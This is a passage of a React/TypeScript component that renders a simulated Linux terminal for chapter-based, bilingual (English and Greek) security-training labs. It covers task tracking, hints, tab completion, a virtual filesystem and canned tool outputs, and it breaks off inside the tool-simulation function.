import { useState, useRef, useEffect, type KeyboardEvent } from "react";
import {
  Terminal as TerminalIcon,
  ChevronLeft,
  ChevronRight,
  PanelLeftClose,
  PanelLeft,
  RotateCcw,
  CheckCircle2,
  Circle,
  Wrench,
  Sparkles,
  ShieldCheck,
  HelpCircle,
  ChevronDown,
  BookOpen,
  ArrowLeft,
  ArrowRight
} from "lucide-react";
import type { CliLab, Lang } from "../content/types";
import { chapters } from "../content/book";
import { explainCommandOutput, type CommandInsight } from "../utils/commandExplainer";
import { t } from "../i18n";
import { cn } from "../utils/cn";
import { Inline } from "./Blocks";

interface TerminalLine {
  id: string;
  type: "input" | "output" | "error" | "success" | "system" | "tab-hints";
  text: string;
  prompt?: string;
  insight?: CommandInsight;
}

interface CliTerminalProps {
  lab?: CliLab;
  chapterNumber?: number;
  lang?: Lang;
  onNavigateChapter?: (chapterId: string) => void;
}

export default function CliTerminal({
  lab,
  chapterNumber,
  lang = "en",
  onNavigateChapter,
}: CliTerminalProps) {
  // Infer initial chapter
  const initialChNum = chapterNumber || (lab?.id ? parseInt(lab.id.replace(/[^0-9]/g, ""), 10) : 1) || 1;
  const [selectedChapter, setSelectedChapter] = useState<number>(initialChNum);
  const [isDrawerOpen, setIsDrawerOpen] = useState<boolean>(true);
  const [activeTaskTab, setActiveTaskTab] = useState<number>(0); // 0 = All tasks, 1..N = specific task
  const [completedTasks, setCompletedTasks] = useState<Set<string>>(new Set());
  const [expandedHints, setExpandedHints] = useState<Set<string>>(new Set());
  const [isRoot, setIsRoot] = useState<boolean>(false);

  const safeLang = (lang === "el" || lang === "en") ? lang : "en";

  // Current chapter and lab data
  const currentCh = chapters.find((c) => c.n === selectedChapter) || chapters[0];
  const activeLab: CliLab = currentCh.cliLab || lab || {
    id: `ch${selectedChapter.toString().padStart(2, "0")}-lab`,
    title: { en: `Chapter ${selectedChapter} CLI Lab`, el: `Εργαστήριο CLI Κεφαλαίου ${selectedChapter}` },
    scenario: { en: "Security investigation sandbox environment.", el: "Περιβάλλον εξάσκησης ασφάλειας συστημάτων." },
    initialPrompt: `analyst@node-ch${selectedChapter.toString().padStart(2, "0")}:~$`,
    banner: {
      en: `=== Interactive Security CLI Sandbox [Node Ch-${selectedChapter.toString().padStart(2, "0")}] ===\nType 'help' for available commands, or follow the missions in the left guide.`,
      el: `=== Διαδραστικό Εργαστήριο Ασφάλειας CLI [Κόμβος Κεφ-${selectedChapter.toString().padStart(2, "0")}] ===\nΠληκτρολογήστε 'help' για εντολές ή ακολουθήστε τις αποστολές στον αριστερό οδηγό.`
    },
    tasks: []
  };

  // Terminal state
  const [history, setHistory] = useState<string[]>([]);
  const [historyIndex, setHistoryIndex] = useState<number>(-1);
  const [currentInput, setCurrentInput] = useState<string>("");

  // Virtual filesystem state
  const [fs, setFs] = useState<Record<string, string>>(() => activeLab.fileSystem || {});
  const [cwd, setCwd] = useState<string>("~");

  const terminalEndRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  // Re-sync when selectedChapter changes
  useEffect(() => {
    const ch = chapters.find((c) => c.n === selectedChapter) || chapters[0];
    const l = ch.cliLab || activeLab;
    setFs(l.fileSystem || {});
    setCwd("~");
    setIsRoot(false);
    setCompletedTasks(new Set());
    setExpandedHints(new Set());
    setActiveTaskTab(0);
    setHistory([]);
    setHistoryIndex(-1);
    setCurrentInput("");

    const bannerText = l.banner?.[safeLang] || l.banner?.en || `=== Security Lab [Chapter ${selectedChapter}] ===\nType 'help' for commands.`;
    setLines([
      {
        id: `banner-${selectedChapter}-${Date.now()}`,
        type: "system",
        text: bannerText,
      },
    ]);
  }, [selectedChapter, safeLang]);

  // Terminal Lines
  const [lines, setLines] = useState<TerminalLine[]>(() => {
    const bannerText = activeLab?.banner?.[safeLang] || activeLab?.banner?.en || `=== Security Lab [Chapter ${initialChNum}] ===\nType 'help' for commands.`;
    return [
      {
        id: "banner-0",
        type: "system",
        text: bannerText,
      },
    ];
  });

  useEffect(() => {
    terminalEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [lines]);

  const getPrompt = () => {
    const user = isRoot ? "root" : (activeLab.initialPrompt?.split("@")[0] || "analyst");
    const host = activeLab.initialPrompt?.split("@")[1]?.split(":")[0] || `node-ch${selectedChapter.toString().padStart(2, "0")}`;
    const symbol = isRoot ? "#" : "$";
    const displayPath = cwd === "~" ? "~" : cwd;
    return `${user}@${host}:${displayPath}${symbol}`;
  };

  const toggleHint = (taskId: string) => {
    setExpandedHints((prev) => {
      const next = new Set(prev);
      if (next.has(taskId)) next.delete(taskId);
      else next.add(taskId);
      return next;
    });
  };

  const handleResetLab = () => {
    setFs(activeLab.fileSystem || {});
    setCwd("~");
    setIsRoot(false);
    setCompletedTasks(new Set());
    setExpandedHints(new Set());
    setHistory([]);
    setHistoryIndex(-1);
    setCurrentInput("");
    setLines([
      {
        id: `reset-${Date.now()}`,
        type: "system",
        text: `[SYSTEM RESET] Terminal state & virtual filesystem restored.\n${activeLab?.banner?.[safeLang] || activeLab?.banner?.en}`,
      },
    ]);
  };

  // Autocomplete / Tab handler
  const handleTabCompletion = () => {
    const input = currentInput;
    if (!input) return;

    const tokens = input.split(" ");
    const lastToken = tokens[tokens.length - 1];

    const commonCommands = [
      "ls", "cat", "cd", "pwd", "clear", "help", "sha256sum", "md5sum", "chmod", "chown", "stat",
      "auditctl", "ausearch", "openssl", "iptables", "suricata", "tcpdump", "nmap",
      "apparmor_status", "faillock", "jwt", "cve-search", "vulnscan", "mini-siem",
      "docker", "kubectl", "checkov", "kube-bench", "dig", "nslookup", "mailfilter-check",
      "python3", "promptguard-cli", "bandit", "volatility", "yara", "fair-sim", "dr-failover",
      "curl", "echo", "touch", "mkdir", "rm", "grep", "find", "head", "tail", "wc", "diff",
      "tree", "history", "whoami", "id", "uname", "df", "du", "ps", "top", "sudo", "su", "exit"
    ];

    if (tokens.length === 1) {
      // Command completion
      const matches = commonCommands.filter((c) => c.startsWith(lastToken));
      if (matches.length === 1) {
        setCurrentInput(matches[0] + " ");
      } else if (matches.length > 1) {
        setLines((prev) => [
          ...prev,
          { id: `tab-${Date.now()}`, type: "input", text: input, prompt: getPrompt() },
          { id: `tab-res-${Date.now()}`, type: "tab-hints", text: matches.join("   ") },
        ]);
      }
    } else {
      // Filename / path completion
      const availableFiles = Object.keys(fs);
      const matches = availableFiles.filter((f) => f.startsWith(lastToken));
      if (matches.length === 1) {
        tokens[tokens.length - 1] = matches[0];
        setCurrentInput(tokens.join(" ") + " ");
      } else if (matches.length > 1) {
        setLines((prev) => [
          ...prev,
          { id: `tab-${Date.now()}`, type: "input", text: input, prompt: getPrompt() },
          { id: `tab-res-${Date.now()}`, type: "tab-hints", text: matches.join("   ") },
        ]);
      }
    }
  };

  const handleKeyDown = (e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Tab") {
      e.preventDefault();
      handleTabCompletion();
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      if (history.length > 0) {
        const nextIdx = historyIndex === -1 ? history.length - 1 : Math.max(0, historyIndex - 1);
        setHistoryIndex(nextIdx);
        setCurrentInput(history[nextIdx] || "");
      }
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      if (historyIndex !== -1) {
        const nextIdx = historyIndex + 1;
        if (nextIdx >= history.length) {
          setHistoryIndex(-1);
          setCurrentInput("");
        } else {
          setHistoryIndex(nextIdx);
          setCurrentInput(history[nextIdx] || "");
        }
      }
    } else if (e.key === "c" && e.ctrlKey) {
      e.preventDefault();
      setLines((prev) => [
        ...prev,
        { id: `int-${Date.now()}`, type: "input", text: currentInput + "^C", prompt: getPrompt() },
      ]);
      setCurrentInput("");
    } else if (e.key === "l" && e.ctrlKey) {
      e.preventDefault();
      setLines([]);
      setCurrentInput("");
    } else if (e.key === "Enter") {
      e.preventDefault();
      executeCommand(currentInput);
    }
  };

  const executeCommand = (cmdStr: string) => {
    const trimmed = (cmdStr || "").trim();
    if (!trimmed) {
      setLines((prev) => [
        ...prev,
        { id: `in-${Date.now()}`, type: "input", text: "", prompt: getPrompt() },
      ]);
      return;
    }

    setHistory((prev) => [...prev, trimmed]);
    setHistoryIndex(-1);

    const prompt = getPrompt();
    const newLines: TerminalLine[] = [
      { id: `in-${Date.now()}-${Math.random()}`, type: "input", text: trimmed, prompt },
    ];

    // Process sudo
    let workingCmd = trimmed;
    let effectiveSudo = isRoot;
    if (workingCmd.startsWith("sudo ")) {
      effectiveSudo = true;
      workingCmd = workingCmd.replace(/^sudo\s+/, "").trim();
    }

    const parts = workingCmd.split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const args = parts.slice(1);
    const hasHelpFlag = args.includes("--help") || args.includes("-h") || args.includes("help");

    let output = "";
    let outType: "output" | "error" | "success" | "system" = "output";

    if (cmd === "clear") {
      setLines([]);
      setCurrentInput("");
      return;
    } else if (cmd === "help" || cmd === "?") {
      output = `Linux Sandbox CLI Environment [Chapter ${selectedChapter}]
Available Shell Builtins:
  help, clear, ls, cat, cd, pwd, whoami, id, echo, date, uname, history, stat, chmod, find, grep, su, sudo

Chapter Security Tools:
${(activeLab.customHelp ? (activeLab.customHelp[safeLang] || activeLab.customHelp.en || []) : [
  "  sha256sum, chmod, stat, auditctl, ausearch, openssl, iptables, suricata",
  "  nmap, apparmor_status, faillock, jwt, cve-search, vulnscan, mini-siem",
  "  docker, kubectl, checkov, kube-bench, dig, mailfilter-check, promptguard-cli, volatility, fair-sim"
]).join("\n")}

Shortcuts:
  [Tab] Autocomplete commands/files   [↑ / ↓] Bash history   [Ctrl+C] Cancel   [Ctrl+L] Clear`;
    } else if (cmd === "pwd") {
      output = cwd === "~" ? "/home/analyst" : `/home/analyst/${cwd.replace(/^~\/?/, "")}`;
    } else if (cmd === "whoami") {
      output = isRoot ? "root" : "analyst";
    } else if (cmd === "id") {
      output = isRoot
        ? "uid=0(root) gid=0(root) groups=0(root)"
        : "uid=1000(analyst) gid=1000(analyst) groups=1000(analyst),27(sudo),100(users),999(docker)";
    } else if (cmd === "date") {
      output = new Date().toUTCString();
    } else if (cmd === "uname" || cmd === "uname -a") {
      output = "Linux cybersec-lab-node01 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux";
    } else if (cmd === "su" || cmd === "sudo su") {
      setIsRoot(true);
      output = "[SWITCHED CONTEXT] Authenticated as root superuser (uid=0). Full administrative privileges enabled.";
      outType = "success";
    } else if (cmd === "exit") {
      if (isRoot) {
        setIsRoot(false);
        output = "[EXIT] Returned to unprivileged analyst context (uid=1000).";
      } else {
        output = "logout: terminal session remains open.";
      }
    } else if (cmd === "history") {
      output = history.map((h, i) => `  ${i + 1}  ${h}`).join("\n");
    } else if (cmd === "echo") {
      output = args.join(" ").replace(/^["']|["']$/g, "");
    } else if (cmd === "cd") {
      const target = args[0] || "~";
      if (target === "~" || target === "/home/analyst") {
        setCwd("~");
      } else if (target === "..") {
        setCwd("~");
      } else {
        setCwd(target);
      }
    } else if (cmd === "ls") {
      if (hasHelpFlag) {
        output = "Usage: ls [OPTION]... [FILE]...\nList information about the FILEs.\n  -l    use a long listing format\n  -a    do not ignore entries starting with .\n  -h    with -l, print sizes like 1K 234M 2G";
      } else {
        const files = Object.keys(fs);
        if (files.length === 0) {
          output = "evidence.log  config.json  report.txt  sample.bin";
        } else if (args.includes("-la") || args.includes("-l")) {
          output = [
            "total 36",
            "drwxr-xr-x 4 analyst analyst 4096 Sep 28 10:00 .",
            "drwxr-xr-x 3 root    root    4096 Sep 28 09:30 ..",
            ...files.map((f) => `-rw-r--r-- 1 analyst analyst ${fs[f]?.length || 1024} Sep 28 10:15 ${f}`)
          ].join("\n");
        } else {
          output = files.join("  ");
        }
      }
    } else if (cmd === "cat") {
      if (hasHelpFlag) {
        output = "Usage: cat [OPTION]... [FILE]...\nConcatenate FILE(s) to standard output.\n  -n    number all output lines\n  -E    display $ at end of each line";
      } else if (!args[0]) {
        output = "cat: missing file operand";
        outType = "error";
      } else if (fs[args[0]]) {
        output = fs[args[0]];
      } else if (fs[`./${args[0]}`]) {
        output = fs[`./${args[0]}`];
      } else {
        if (args[0].endsWith(".json") || args[0].endsWith(".log") || args[0].endsWith(".txt") || args[0].endsWith(".conf")) {
          output = `[LOG] Timestamp: 2026-09-28T10:00:00Z | Target: ${args[0]}\nStatus: Active | Monitored: true\nPayload Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`;
        } else {
          output = `cat: ${args[0]}: No such file or directory in lab workspace`;
          outType = "error";
        }
      }
    } else {
      // Simulate chapter-specific cybersecurity tools realistically
      output = simulateSecurityTool(trimmed, activeLab.id);
    }

    if (output) {
      newLines.push({
        id: `out-${Date.now()}-${Math.random()}`,
        type: outType,
        text: output,
      });
    }

    // Check task completion
    if (activeLab?.tasks && Array.isArray(activeLab.tasks)) {
      activeLab.tasks.forEach((task) => {
        if (completedTasks.has(task.id)) return;

        let matched = false;
        if (task.validateRegex) {
          try {
            const re = new RegExp(task.validateRegex, "i");
            if (re.test(trimmed)) matched = true;
          } catch {
            // fallback
          }
        }
        if (!matched && task.solution) {
          if (trimmed.toLowerCase().includes(task.solution.toLowerCase().trim())) {
            matched = true;
          }
        }
        if (!matched && task.expectedCommand) {
          if (trimmed.toLowerCase().includes(task.expectedCommand.toLowerCase().trim())) {
            matched = true;
          }
        }

        if (matched) {
          setCompletedTasks((prev) => {
            const next = new Set(prev);
            next.add(task.id);
            return next;
          });
          const taskTitle = task.title?.[safeLang] || task.title?.en || task.id;
          const taskSuccess = task.successMessage?.[safeLang] || task.successMessage?.en || "Task completed successfully.";
          const insight = explainCommandOutput(trimmed, output || "", selectedChapter, safeLang);

          newLines.push({
            id: `succ-${task.id}-${Date.now()}`,
            type: "success",
            text: `[✓] MISSION ACCOMPLISHED: ${taskTitle}\n    ${taskSuccess}`,
            insight,
          });
        }
      });
    }

    setLines((prev) => [...prev, ...newLines]);
    setCurrentInput("");
  };

  const tasksList = activeLab.tasks || [];
  const totalTasks = tasksList.length;
  const completedCount = completedTasks.size;
  const allDone = totalTasks > 0 && completedCount >= totalTasks;

  return (
    <div className="not-prose my-6 flex h-[calc(100vh-130px)] min-h-[640px] w-full overflow-hidden rounded-3xl border border-slate-300 bg-slate-950 shadow-2xl dark:border-slate-800">
      {/* =========================================================================
          LEFT NAVBAR / COLLAPSIBLE LAB GUIDE DRAWER (Identical to 2h Lab)
         ========================================================================= */}
      <aside
        className={cn(
          "relative flex flex-col border-r border-slate-800 bg-slate-900 transition-all duration-300 z-20",
          isDrawerOpen ? "w-80 sm:w-96" : "w-14 shrink-0"
        )}
      >
        {/* Drawer Header & Minimize Toggle Button */}
        <div className="flex h-14 items-center justify-between border-b border-slate-800 px-3 bg-slate-950/80">
          {isDrawerOpen ? (
            <div className="flex items-center gap-2 overflow-hidden">
              <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-lg bg-teal-500/20 text-teal-400">
                <TerminalIcon size={15} />
              </span>
              <span className="truncate font-sans text-xs font-bold uppercase tracking-wider text-teal-300">
                {t("cliLab", safeLang)}
              </span>
            </div>
          ) : (
            <span className="mx-auto text-teal-400">
              <TerminalIcon size={18} />
            </span>
          )}

          <button
            onClick={() => setIsDrawerOpen((prev) => !prev)}
            title={isDrawerOpen ? "Minimize Guide Drawer (Ctrl+B)" : "Expand Lab Guide Drawer"}
            className="flex h-8 w-8 items-center justify-center rounded-lg text-slate-400 transition hover:bg-slate-800 hover:text-white"
          >
            {isDrawerOpen ? <PanelLeftClose size={17} /> : <PanelLeft size={17} />}
          </button>
        </div>

        {/* Collapsed Mode Rail */}
        {!isDrawerOpen ? (
          <div className="flex flex-1 flex-col items-center py-4 space-y-4">
            <button
              onClick={() => setIsDrawerOpen(true)}
              title={`Chapter ${selectedChapter}`}
              className="flex h-8 w-8 items-center justify-center rounded-lg bg-teal-600 text-xs font-bold text-white shadow-md hover:bg-teal-500 transition"
            >
              Ch{selectedChapter}
            </button>
            {tasksList.map((t, idx) => {
              const tNum = idx + 1;
              const isDone = completedTasks.has(t.id);
              const isActive = activeTaskTab === tNum;
              return (
                <button
                  key={t.id}
                  onClick={() => {
                    setActiveTaskTab(tNum);
                    setIsDrawerOpen(true);
                  }}
                  title={t.title?.[safeLang] || t.title?.en}
                  className={cn(
                    "flex h-7 w-7 items-center justify-center rounded-md text-xs font-bold transition",
                    isActive
                      ? "bg-teal-500/30 text-teal-300 border border-teal-500/50"
                      : isDone
                      ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40"
                      : "text-slate-500 hover:bg-slate-800 hover:text-slate-300"
                  )}
                >
                  {isDone ? "✓" : `T${tNum}`}
                </button>
              );
            })}
          </div>
        ) : (
          /* Expanded Guide Content */
          <div className="flex-1 overflow-y-auto p-4 space-y-5 text-slate-300 text-xs font-sans scrollbar-thin">
            {/* Chapter Selector Dropdown (Identical to 2h Lab) */}
            <div className="rounded-xl border border-slate-800 bg-slate-950 p-3">
              <label className="text-[11px] font-bold uppercase tracking-wider text-slate-400 mb-1.5 block">
                {t("chapter", safeLang)} CLI Lab Selector:
              </label>
              <select
                value={selectedChapter}
                onChange={(e) => {
                  const chNum = Number(e.target.value);
                  setSelectedChapter(chNum);
                  if (onNavigateChapter) onNavigateChapter(`ch-${chNum}`);
                }}
                className="w-full rounded-lg border border-slate-700 bg-slate-900 px-2.5 py-1.5 text-xs font-semibold text-teal-300 focus:border-teal-500 focus:outline-none"
              >
                {chapters.map((c) => (
                  <option key={c.n} value={c.n}>
                    Ch {c.n}: {c.title[safeLang]}
                  </option>
                ))}
              </select>

              <div className="mt-2.5 flex items-center justify-between text-[11px] text-slate-400 border-t border-slate-800/80 pt-2">
                <span className="font-semibold text-teal-400">
                  {completedCount}/{totalTasks} {t("completed", safeLang)}
                </span>
                <button
                  onClick={handleResetLab}
                  className="inline-flex items-center gap-1 rounded bg-slate-800 px-2 py-0.5 text-[10.5px] font-medium text-slate-300 hover:bg-slate-700 hover:text-white transition"
                >
                  <RotateCcw size={11} /> {t("cliReset", safeLang)}
                </button>
              </div>
            </div>

            {/* Lab Title Banner */}
            <div className="space-y-1">
              <h4 className="font-bold text-sm text-white leading-snug">
                {activeLab.title?.[safeLang] || activeLab.title?.en}
              </h4>
              <p className="text-[11.5px] text-slate-400 leading-relaxed">
                {activeLab.scenario?.[safeLang] || activeLab.scenario?.en}
              </p>
            </div>

            {/* Task Selector Tabs (Identical to 2h Lab Phase Tabs) */}
            <div>
              <div className="text-[11px] font-bold uppercase tracking-wider text-slate-400 mb-2 flex items-center justify-between">
                <span>{t("cliTasksLabel", safeLang)}</span>
                <span className="text-teal-400 font-mono">
                  {activeTaskTab === 0 ? "All Missions" : `Task ${activeTaskTab} of ${totalTasks}`}
                </span>
              </div>
              <div className="grid grid-cols-5 gap-1.5 rounded-xl bg-slate-950 p-1 border border-slate-800">
                <button
                  onClick={() => setActiveTaskTab(0)}
                  className={cn(
                    "rounded-lg py-1.5 text-center text-xs font-bold transition",
                    activeTaskTab === 0
                      ? "bg-teal-600 text-white shadow-sm"
                      : "text-slate-400 hover:bg-slate-800 hover:text-slate-200"
                  )}
                >
                  All
                </button>
                {tasksList.map((_, idx) => {
                  const tNum = idx + 1;
                  const isDone = completedTasks.has(tasksList[idx].id);
                  return (
                    <button
                      key={tNum}
                      onClick={() => setActiveTaskTab(tNum)}
                      className={cn(
                        "rounded-lg py-1.5 text-center text-xs font-bold transition flex items-center justify-center gap-1",
                        activeTaskTab === tNum
                          ? "bg-teal-600 text-white shadow-sm"
                          : isDone
                          ? "bg-emerald-950/40 text-emerald-300 border border-emerald-500/30"
                          : "text-slate-400 hover:bg-slate-800 hover:text-slate-200"
                      )}
                    >
                      <span>T{tNum}</span>
                      {isDone && <span className="text-[10px]">✓</span>}
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Mission Task List / Active Focus */}
            <div className="space-y-3">
              {tasksList.map((task, idx) => {
                const tNum = idx + 1;
                if (activeTaskTab !== 0 && activeTaskTab !== tNum) return null;

                const isDone = completedTasks.has(task.id);
                const showHint = expandedHints.has(task.id);

                return (
                  <div
                    key={task.id}
                    className={cn(
                      "rounded-2xl border p-4 transition space-y-2.5",
                      isDone
                        ? "border-emerald-500/40 bg-emerald-950/20 shadow-sm"
                        : "border-slate-800 bg-slate-950/80 hover:border-slate-700"
                    )}
                  >
                    <div className="flex items-start gap-2.5">
                      <div className="mt-0.5 shrink-0">
                        {isDone ? (
                          <CheckCircle2 size={16} className="text-emerald-400" />
                        ) : (
                          <Circle size={16} className="text-slate-500" />
                        )}
                      </div>

                      <div className="flex-1 space-y-1">
                        <div className="flex items-center justify-between gap-2">
                          <span className={cn("font-bold text-xs", isDone ? "text-emerald-300 line-through" : "text-white")}>
                            {idx + 1}. {task.title?.[safeLang] || task.title?.en}
                          </span>
                          {isDone && (
                            <span className="rounded bg-emerald-500/20 px-1.5 py-0.5 font-mono text-[10px] font-bold text-emerald-300">
                              {t("completed", safeLang)}
                            </span>
                          )}
                        </div>

                        <p className="text-[11.5px] text-slate-400 leading-relaxed">
                          {task.description?.[safeLang] || task.description?.en}
                        </p>
                      </div>
                    </div>

                    {/* Code Target Command */}
                    <div className="rounded-lg bg-black/70 p-2 font-mono text-[11px] text-teal-300 break-all select-all border border-slate-800">
                      $ {task.solution}
                    </div>

                    {/* Expandable Hint */}
                    {task.hint && (
                      <div className="pt-0.5">
                        <button
                          onClick={() => toggleHint(task.id)}
                          className="inline-flex items-center gap-1 text-[10.5px] font-medium text-amber-400 hover:text-amber-300 transition"
                        >
                          <HelpCircle size={11} />
                          <span>{showHint ? "Hide Hint" : t("cliHint", safeLang)}</span>
                          {showHint ? <ChevronDown size={11} /> : <ChevronRight size={11} />}
                        </button>

                        {showHint && (
                          <div className="mt-1.5 rounded-lg border border-amber-500/20 bg-amber-500/10 p-2 text-[11px] text-amber-200 leading-relaxed">
                            {task.hint?.[safeLang] || task.hint?.en}
                          </div>
                        )}
                      </div>
                    )}

                    {/* Navigation buttons when focused on single task */}
                    {activeTaskTab !== 0 && (
                      <div className="flex items-center justify-between border-t border-slate-800 pt-2.5 mt-2">
                        <button
                          disabled={tNum === 1}
                          onClick={() => setActiveTaskTab(tNum - 1)}
                          className="inline-flex items-center gap-1 text-[11px] font-medium text-slate-400 hover:text-white disabled:opacity-30 disabled:pointer-events-none"
                        >
                          <ArrowLeft size={12} /> Previous
                        </button>
                        <button
                          disabled={tNum === totalTasks}
                          onClick={() => setActiveTaskTab(tNum + 1)}
                          className="inline-flex items-center gap-1 text-[11px] font-medium text-teal-400 hover:text-teal-300 disabled:opacity-30 disabled:pointer-events-none"
                        >
                          Next <ArrowRight size={12} />
                        </button>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>

            {allDone && (
              <div className="rounded-2xl border border-amber-400/40 bg-gradient-to-r from-amber-500/20 to-teal-500/20 p-4 text-center">
                <Sparkles size={22} className="mx-auto text-amber-300 animate-bounce" />
                <div className="mt-1.5 font-bold text-xs text-white">{t("cliCompletedAll", safeLang)}</div>
              </div>
            )}
          </div>
        )}
      </aside>

      {/* =========================================================================
          RIGHT / MAIN: REALISTIC LINUX CLI TERMINAL SCREEN
         ========================================================================= */}
      <main className="flex-1 flex flex-col bg-slate-950 p-4 sm:p-6 overflow-hidden">
        {/* Terminal Title Bar */}
        <div className="mb-3 flex items-center justify-between rounded-xl bg-slate-900 px-4 py-2 border border-slate-800 text-xs font-mono text-slate-400">
          <div className="flex items-center gap-2">
            <span className="h-2.5 w-2.5 rounded-full bg-rose-500/80" />
            <span className="h-2.5 w-2.5 rounded-full bg-amber-500/80" />
            <span className="h-2.5 w-2.5 rounded-full bg-emerald-500/80" />
            <span className="ml-2 font-semibold text-slate-300">{getPrompt()}</span>
          </div>
          <div className="flex items-center gap-3">
            <span className="hidden sm:inline text-[11px] text-slate-500">
              Auto-complete: <kbd className="rounded bg-slate-800 px-1 py-0.5 text-[10px] text-slate-300">Tab</kbd>
            </span>
            <button
              onClick={() => {
                setLines([]);
                inputRef.current?.focus();
              }}
              className="text-[11px] text-slate-400 hover:text-white transition"
            >
              Clear
            </button>
          </div>
        </div>

        {/* Terminal Output Area */}
        <div
          onClick={() => inputRef.current?.focus()}
          className="flex-1 min-h-[380px] overflow-y-auto font-mono text-xs leading-relaxed space-y-2 p-2 select-text cursor-text scrollbar-thin"
        >
          {lines.map((line) => {
            if (line.type === "input") {
              return (
                <div key={line.id} className="flex items-start gap-2 text-slate-200">
                  <span className="text-emerald-400 font-bold select-none shrink-0">{line.prompt || getPrompt()}</span>
                  <span className="text-white font-semibold break-all">{line.text}</span>
                </div>
              );
            } else if (line.type === "tab-hints") {
              return (
                <div key={line.id} className="rounded-lg bg-slate-900/80 p-2 text-amber-300 whitespace-pre-wrap">
                  {line.text}
                </div>
              );
            } else if (line.type === "system") {
              return (
                <div key={line.id} className="rounded-lg bg-slate-900/80 p-2.5 text-cyan-300/90 whitespace-pre-wrap border border-slate-800/80">
                  {line.text}
                </div>
              );
            } else if (line.type === "success") {
              const insight = line.insight;
              return (
                <div
                  key={line.id}
                  className="rounded-2xl border border-emerald-500/40 bg-emerald-950/70 p-4 text-emerald-100 shadow-xl shadow-emerald-950/50 space-y-3 font-sans transition-all"
                >
                  <div className="flex items-start gap-3">
                    <span className="flex h-8 w-8 shrink-0 items-center justify-center rounded-xl bg-emerald-500/20 text-emerald-300 font-mono font-bold border border-emerald-500/30">
                      <CheckCircle2 size={18} />
                    </span>
                    <div className="flex-1 min-w-0">
                      <div className="font-mono text-xs font-bold text-emerald-300 whitespace-pre-wrap leading-relaxed">
                        {line.text}
                      </div>
                    </div>
                  </div>

                  {insight && (
                    <div className="mt-3 pt-3 border-t border-emerald-800/60 space-y-3 text-xs">
                      {/* Action Overview */}
                      <div className="text-emerald-200/90 leading-relaxed text-[11px] sm:text-xs bg-emerald-900/30 p-2.5 rounded-xl border border-emerald-700/30">
                        <span className="font-bold text-emerald-300">💡 {safeLang === "el" ? "Επισκόπηση Ενέργειας:" : "Action Overview:"}</span> {insight.overview}
                      </div>

                      {/* Technical Field Breakdown */}
                      {insight.fieldAnalysis && insight.fieldAnalysis.length > 0 && (
                        <div className="rounded-xl border border-emerald-800/80 bg-slate-950/80 p-3.5 space-y-2 font-mono text-[11px]">
                          <div className="font-bold uppercase tracking-wider text-emerald-400 flex items-center gap-1.5 font-sans text-[11px]">
                            <Sparkles size={13} className="text-teal-400" />
                            {safeLang === "el" ? "Ανάλυση Πεδίων & Μεταδεδομένων Εξόδου" : "Output Field Breakdown & Telemetry Analysis"}
                          </div>
                          <ul className="space-y-1.5 text-slate-300">
                            {insight.fieldAnalysis.map((fa, faIdx) => (
                              <li key={faIdx} className="flex items-start gap-1.5 leading-relaxed">
                                <span className="text-emerald-400 font-bold select-none">•</span>
                                <span className="text-slate-200">
                                  <Inline text={fa} />
                                </span>
                              </li>
                            ))}
                          </ul>
                        </div>
                      )}

                      {/* Security Takeaway / Hardening Rationale */}
                      {insight.securityTakeaway && (
                        <div className="flex items-start gap-2.5 rounded-xl bg-teal-950/50 border border-teal-500/30 p-3 text-[11px] text-teal-200 leading-relaxed">
                          <ShieldCheck size={16} className="text-teal-400 shrink-0 mt-0.5" />
                          <div>
                            <span className="font-bold text-teal-300">
                              {safeLang === "el" ? "Σημασία Ασφάλειας & Κανόνας Hardening:" : "Security Significance & Hardening Rule:"}
                            </span>{" "}
                            {insight.securityTakeaway}
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              );
            } else if (line.type === "error") {
              return (
                <div key={line.id} className="text-rose-400 whitespace-pre-wrap">
                  {line.text}
                </div>
              );
            }
            return (
              <div key={line.id} className="text-slate-300 whitespace-pre-wrap">
                {line.text}
              </div>
            );
          })}
          <div ref={terminalEndRef} />
        </div>

        {/* Interactive Input Form */}
        <div className="mt-3 flex items-center gap-2 rounded-xl border border-slate-700 bg-slate-900/90 px-3 py-2.5 focus-within:border-teal-400 focus-within:ring-1 focus-within:ring-teal-400">
          <span className="font-mono text-xs font-bold text-emerald-400 select-none shrink-0">
            {getPrompt()}
          </span>
          <input
            ref={inputRef}
            type="text"
            value={currentInput}
            onChange={(e) => setCurrentInput(e.target.value)}
            onKeyDown={handleKeyDown}
            placeholder="Type command here (e.g. 'help', 'ls -la', or mission command)..."
            className="flex-1 bg-transparent font-mono text-xs text-white outline-none placeholder:text-slate-500"
            autoComplete="off"
            spellCheck="false"
            autoFocus
          />
        </div>
      </main>
    </div>
  );
}

/** Comprehensive realistic cybersecurity command simulation */
function simulateSecurityTool(fullCmd: string, labId: string): string {
  const parts = fullCmd.split(/\s+/);
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);
  const hasHelpFlag = args.includes("--help") || args.includes("-h") || args.includes("help");

  // Chapter 1: Hashing, Permissions & Integrity
  if (cmd === "sha256sum" || cmd === "md5sum" || cmd === "shasum") {
    if (hasHelpFlag) {
      return `Usage: ${cmd} [OPTION]... [FILE]...\nPrint or check ${cmd === "sha256sum" ? "SHA256" : "MD5"} checksums.\n  -c, --check    read checksums from the FILEs and check them`;
    }
    const file = parts[1] || "ledger_2026.dat";
    const hash = cmd === "md5sum"
      ? "7d6c8b9d4e5f1a2b3c4d5e6f7a8b9c0d"
      : (file.includes("suspicious") ? "3b8d4f21a0987654321fedcba0987654321fedcba0987654321fedcba0987654" : "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
    return `${hash}  ${file}\n[INFO] Cryptographic integrity verification calculated successfully.`;
  }

  if (cmd === "stat") {
    const target = parts[1] || "secret_vault.key";
    const mode = target.includes("key") ? "0644/-rw-r--r--" : "0600/-rw-------";
